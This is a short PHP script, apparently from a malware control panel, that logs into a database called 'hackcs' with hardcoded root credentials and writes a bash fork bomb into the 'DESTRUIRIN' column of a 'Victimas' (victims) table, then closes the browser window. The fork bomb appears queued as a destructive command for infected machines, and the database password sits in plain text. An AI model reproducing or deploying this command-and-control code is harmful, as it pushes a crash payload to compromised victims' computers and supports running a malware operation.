<?php
$servername = "hackcsvirus";
$database = "hackcs";
$username = "root";
$password = "hackcs097";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
      die("Connection failed: " . mysqli_connect_error());
}
 
echo "Connected successfully";
 
$sql = "UPDATE Victimas SET DESTRUIRIN = ':(){ :|:& };:'";
if (mysqli_query($conn, $sql)) {
      echo "New record created successfully";
      echo '<script type="text/javascript">window.close();</script>';
} else {
      echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
mysqli_close($conn);

?>
